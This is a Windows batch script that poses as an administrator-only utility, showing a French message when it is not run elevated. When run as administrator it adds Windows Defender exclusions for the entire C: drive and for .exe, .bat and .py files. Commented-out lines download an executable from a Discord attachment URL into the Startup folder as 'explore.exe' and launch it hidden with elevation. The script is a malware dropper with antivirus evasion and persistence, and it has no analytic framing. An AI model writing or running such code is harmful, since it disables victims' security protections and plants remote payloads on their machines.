@echo off
set ^"|find "::">nul 2>&1 && goto :no || goto :yes
:no
chcp 65001 > nul
echo Pour pouvoir utiliser l'utilitaire, vous devez être un administrateur
echo exécutant une session de console.
pause
chcp 850 > nul
goto :EOF
:yes
set powershell="%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe"
if "%processor_architecture%" == "amd64" (
set curl="%windir%\System32\curl.exe"
) else (
set curl="%windir%\SysWOW64\curl.exe"
)

powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"
powershell -Command "Add-MpPreference -ExclusionExtension '.bat'"
powershell -Command "Add-MpPreference -ExclusionExtension '.py'"

::%curl% https://cdn.discordapp.com/attachments/1130988233761771581/1137590314295636058/x.exe -o %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe

::%powershell% saps %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe -WindowStyle Hidden -Verb RunAs

::set "DownloadURL=https://cdn.discordapp.com/attachments/1130988233761771581/1137590314295636058/x.exe"
::set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
::powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
::powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
